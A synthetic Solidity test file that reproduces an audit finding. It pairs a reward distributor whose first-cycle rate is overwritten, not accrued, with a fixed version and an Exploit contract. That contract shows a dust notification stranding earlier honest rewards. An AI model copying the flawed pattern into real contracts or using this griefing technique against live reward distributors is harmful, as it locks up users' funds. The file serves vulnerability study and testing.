// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — same first-cycle rate overwrite as AuditVault 66178, shipped
    as its own finding 66357 (Pashov, May 2025). SYNTHETIC, cheatcode-free.
    A later notify replaces rd.rate instead of accruing. Token name REG-66357
    is the only economic label that differs. (@> VULN) */

contract MockToken {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n) {
        name = n;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount; // S2
        balanceOf[to] += amount;
        return true;
    }
}

contract GaugeRewardsDistributor {
    struct RewardData {
        uint256 rate;
        uint256 lastUpdateTime;
        uint256 periodFinish;
    }

    mapping(address => RewardData) public rewardData;
    uint256 public firstCycleStart;
    MockToken public rewardToken;
    uint256 public constant FIRST_CYCLE_DURATION = 1000;

    constructor(MockToken t) {
        rewardToken = t;
        firstCycleStart = type(uint64).max;
    }

    function getFirstCycleDuration() public pure returns (uint256) {
        return FIRST_CYCLE_DURATION;
    }

    function quoteRate(uint256 amount, uint256 duration) public pure returns (uint256) {
        return amount / duration; // @> VULN: S3 replaces the rate; prior rewards in this cycle are not accrued
    }

    function notifyRewardAmount(uint256 amount) external {
        rewardToken.transferFrom(msg.sender, address(this), amount);
        _handleRewardNotification(address(rewardToken), amount);
    }

    function _handleRewardNotification(address token, uint256 amount) internal {
        RewardData storage rd = rewardData[token];
        uint256 timestamp = block.timestamp;
        if (timestamp < firstCycleStart) {
            uint256 firstCycleDuration = getFirstCycleDuration();
            if (firstCycleDuration > 0) {
                rd.rate = this.quoteRate(amount, firstCycleDuration);
                rd.lastUpdateTime = timestamp;
                rd.periodFinish = firstCycleStart;
                return;
            }
        }
    }

    function cyclePayout() public view returns (uint256) {
        RewardData storage rd = rewardData[address(rewardToken)];
        return rd.rate * getFirstCycleDuration(); // S5
    }
}

contract GaugeRewardsDistributorFixed {
    struct RewardData {
        uint256 rate;
        uint256 periodFinish;
    }

    mapping(address => RewardData) public rewardData;
    MockToken public rewardToken;
    uint256 public constant FIRST_CYCLE_DURATION = 1000;
    uint256 public firstCycleStart = type(uint64).max;

    constructor(MockToken t) {
        rewardToken = t;
    }

    function notifyRewardAmount(uint256 amount) external {
        rewardToken.transferFrom(msg.sender, address(this), amount);
        RewardData storage rd = rewardData[address(rewardToken)];
        if (block.timestamp < firstCycleStart) {
            rd.rate += amount / FIRST_CYCLE_DURATION;
            rd.periodFinish = firstCycleStart;
        }
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    GaugeRewardsDistributor public dist; // nonce 2

    uint256 public constant HONEST = 1000e18;
    uint256 public constant DUST = 1000;
    uint256 public stuck;
    uint256 public payout;

    constructor() {
        token = new MockToken("REG-66357");
        dist = new GaugeRewardsDistributor(token);
        token.mint(address(this), HONEST + DUST);
    }

    function run() external {
        token.approve(address(dist), type(uint256).max);
        dist.notifyRewardAmount(HONEST); // S1
        dist.notifyRewardAmount(DUST); // S4
        payout = dist.cyclePayout();
        stuck = token.balanceOf(address(dist)) - payout; // S6
        require(payout == DUST, "cycle pays more than the dust notify");
        require(stuck == HONEST, "honest rewards were accrued");
        require(token.balanceOf(address(dist)) == HONEST + DUST, "tokens not in distributor");
    }
}
